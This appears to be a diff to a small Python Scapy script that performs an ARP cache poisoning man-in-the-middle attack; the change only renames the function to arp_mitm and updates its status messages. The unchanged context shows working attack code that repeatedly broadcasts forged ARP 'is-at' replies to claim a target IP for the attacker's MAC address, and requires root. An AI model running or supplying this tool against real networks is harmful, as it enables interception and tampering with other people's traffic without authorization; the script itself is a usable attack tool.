@@ -11,11 +11,11 @@ from os import geteuid
 from sys import argv, exit
 from argparse import ArgumentParser
 
-def mitm(interface, target, interval=10):
+def arp_mitm(interface, target, interval=10):
 	"""ARP cache poisoning attack"""
 
 	myMAC = get_if_hwaddr(interface)
-	print("[*] Starting attack ...")
+	print("[*] Starting ARP MITM attack ...")
 	while 1:
 		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
 		sleep(interval)
@@ -31,8 +31,8 @@ if __name__ == "__main__":
 		exit("[!] You must be root")
 
 	try:
-		mitm(args["interface"], args["target"], args["interval"])
+		arp_mitm(args["interface"], args["target"], args["interval"])
 	except IOError:
 		exit("[!] Interface doesn't exist")
 	except KeyboardInterrupt:
-		print("\n[*] Stopping attack")
+		print("\n[*] Stopping ARP MITM attack")
